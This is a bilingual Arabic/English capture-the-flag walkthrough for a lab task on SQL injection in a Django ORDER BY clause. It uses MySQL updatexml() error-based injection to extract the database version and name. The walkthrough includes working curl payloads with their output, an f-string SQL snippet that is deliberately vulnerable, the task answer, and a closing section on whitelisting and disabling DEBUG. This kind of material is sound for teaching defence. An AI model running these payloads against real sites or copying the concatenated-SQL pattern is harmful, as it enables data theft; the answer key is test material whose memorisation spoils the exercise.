# Task 04: Django (إطار عمل Django وحقن SQL في جمل الترتيب ORDER BY عبر CVE-2021-35042)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Django is a high-level, batteries-included Python web framework designed for rapid and clean development. It includes an Object-Relational Mapper (ORM), automated admin interface, and built-in protection against common web attacks.

**Fingerprinting Django (Port 8000):**
Querying port 8000 with `curl -I "http://MACHINE_IP:8000/products/"` produces characteristic signatures:
1. `Server: WSGIServer/0.2 CPython/3.10.12` (the standard Python WSGI development server header).
2. `Set-Cookie: csrftoken=...` generated by Django's `CsrfViewMiddleware`.
3. Default security headers injected by `SecurityMiddleware`: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`.
4. In HTML forms, Django requires a hidden input field to protect against Cross-Site Request Forgery: **`<input type="hidden" name="csrfmiddlewaretoken" ...>`**. The presence of this specific field name is a near-certain indicator of a Django application.

**Vulnerability: CVE-2021-35042 (SQL Injection in QuerySet.order_by()):**
- **CVSS Score:** 9.8 (Critical)
- **Root Cause:** In certain Django versions and custom raw implementations, user-controlled parameters passed directly into `order_by()` or concatenated into raw SQL `ORDER BY` clauses are not properly sanitized or bound to parameterized prepared statements.
- On port 8000, the products endpoint filters and sorts items using:
  ```python
  sql = f"SELECT id, name, price, description FROM products_product ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)"
  ```
- Because the backend runs MySQL with `DEBUG = True`, attackers can leverage **XPath Error-Based SQL Injection** using the MySQL `updatexml()` or `extractvalue()` functions. By concatenating the tilde character (`0x7e` or `~`), the database generates an XPath parsing error containing the query result directly inside the error message!

2. Using manual curl payloads, what is the name of the vulnerable database? (Answer Format: database_name)

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تشريح حقن SQL المعتمد على أخطاء XPath (Error-Based SQLi with updatexml):**
  * دالة `updatexml(xml_target, xpath_expr, new_xml)` في MySQL تتوقع وسيطاً ثانياً بصيغة XPath صالحة.
  * إذا بدأ التعبير بـ `~` (وهو محرف غير قانوني في بداية مسار XPath)، فإن MySQL تفشل وتطبع رسالة خطأ تفصيلية تحتوي على القيمة المعطاة:
    `XPATH syntax error: '~value'`
  * بما أن وضع التطوير `DEBUG = True` مفعل في تطبيق Django هذا، فإن استثناءات بايثون وأخطاء قاعدة البيانات يتم طباعتها مباشرة في صفحة الويب الناتجة (HTTP 500 Debug Traceback).
* **الحس الأمني في فحص مدخلات الترتيب:**
  * يقع الكثير من المطورين في فخ افتراض أن جمل `ORDER BY` لا يمكن استغلالها بحقن `UNION` العادي، فيلجأون لدمج النصوص يدويًا بدلاً من القوائم البيضاء (Whitelisting). هنا تصبح تقنيات Error-Based أو Time-Based الحل الأمثل للاستخراج.

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * ابحث في أي نموذج POST في تطبيق Django عن حقل الرمز المميز للحماية من التزوير، واسمه البرمجي يبدأ بـ `csrf...`.
2. **التلميح الثاني (المستوى العملي):**
   * عند إرسال معامل `order` غير صالح، افحص استجابة الخادم لمعرفة ما إذا كانت صفحة الخطأ تكشف كود الاستعلام ومحرك قاعدة البيانات.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * استخدم دالة `updatexml(1,concat(0x7e,(select database())),1)` كقيمة للمعامل `order` في الرابط:
     `http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)`
   * ابحث في المخرجات عن المحرف `~` لاستخراج اسم قاعدة البيانات مباشرة.

#### الخطوة 2: اختبار نقطة فرز المنتجات وفحص سلوك الخطأ
```bash

```
نلاحظ أن التطبيق يعيد صفحة تتبع الأخطاء البرمجية (Django Debug Traceback) مبيناً وجود استعلام SQL خام.

---

#### الخطوة 3: استغلال حقن XPath لاستخراج إصدار قاعدة البيانات واسمها
```bash
# 1. استخراج إصدار MySQL لتأكيد عمل الحقن بنجاح
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
# المخرجات: ~8.0.45-0ubuntu0.22.04.1

# 2. استخراج اسم قاعدة البيانات الحالية
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
# المخرجات: ~vuln_db
```

* القيمة المستخرجة بعد محرف الـ `~`: **`vuln_db`**.

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
لا يجب على الإطلاق دمج مدخلات المستخدم نصياً في جمل `ORDER BY`، حيث إن المعاملات القياسية لقواعد البيانات لا تدعم ترتيب الأعمدة الديناميكي كمعاملات استعلام مهيأة (Parameterized Values). الحل الدفاعي الصحيح هو فرض قائمة بيضاء صارمة (Strict Whitelist) على الحقول المسموح بالترتيب بناءً عليها، مع إيقاف وضع `DEBUG = False` تماماً في بيئات الإنتاج لمنع تسريب رسائل الخطأ التفصيلية.
